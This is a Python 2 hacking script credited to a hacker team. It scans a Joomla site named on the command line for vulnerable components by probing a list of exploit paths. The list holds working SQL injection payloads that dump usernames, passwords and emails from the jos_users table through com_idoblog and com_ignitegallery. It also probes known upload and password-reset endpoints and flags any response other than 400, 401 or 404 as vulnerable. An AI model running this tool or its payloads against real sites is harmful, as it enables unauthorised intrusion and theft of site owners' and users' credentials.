#!/usr/bin/python

# Powered By Dr,AFN[D]ENA

import sys,urllib2,time,httplib



mtucx = 5

dzx = 4



print "C0ded By M.tucX"

print "Gr3etZ to : Makers Hacker Team"

print "pyhthon joomla.py www.site.com"



BAD_RESP = [400,401,404]



def main(path):

    print "Scan:",host.split("/",1)[1]+path

    try:

        h = httplib.HTTP(host.split("/",1)[0])

        h.putrequest("HEAD", "/"+host.split("/",1)[1]+path)

        h.putheader("Host", host.split("/",1)[0])

        h.endheaders()

        resp, reason, headers = h.getreply()

        return resp, reason, headers.get("Server")

    except(), msg: 

        print "Error Occurred:",msg

        pass



def timer():

    now = time.localtime(time.time())

    return time.asctime(now)



dzx = { "index.php?option=com_idoblog&task=profile&Itemid=1337&userid=62+union+select+1,2,concat%28username,0x3a,password,0x3a,email%29,4,5,6,7,8,9,10,11,12,13,14,15,16+from+jos_users--" : ["com_idoblog"], "index.php?option=com_ignitegallery&task=view&gallery=-4+union+all+select+1,2,group_concat(id,0x3a,name,0x3a,username,0x3a,email,0x3a,password,0x3a,usertype),4,5,6,7,8,9,10+from+jos_users--" : ["com_ignitegallery"], "index.php?option=com_media&view=images&tmpl=component&fieldid=&e_name=jform_articletext&asset=com_content&author=&folder=" : ["com_media"], "administrator/components/com_redmystic/chart/tmp-upload-images/" : ["com_redmystic"], "index.php?option=com_users&view=registration" : ["com_user"], "index.php?option=com_jce" : ["JCE","link"], "index.php?option=com_user&view=reset&layout=confirm" : ["com_user"], "index.php?option=com_smartformer":["com_smartformer"],"index.php?option=com_garyscookbook&func=newItem":["com_garyscookbook"],"index.php/component/osproperty/?task=agent_register":["com_osproperty"]}



if len(sys.argv) != 2:

    sys.exit(1)



host = sys.argv[1].replace("http://","").rsplit("/",1)[0]

if host[-1] != "/":

    host = host+"/"

    

print "\nTarget:",host

print "\nScanning Exploit\n"

for xpl,(poc) in dzx.items():

    resp,reason,server = main(xpl)

    if resp not in BAD_RESP:

        print ""

        print "\nResult:",resp, reason

        print "\nVuln",poc

    else:

        print ""

        print "\nResult:",resp, reason

        print 

print "\nEnd\n"
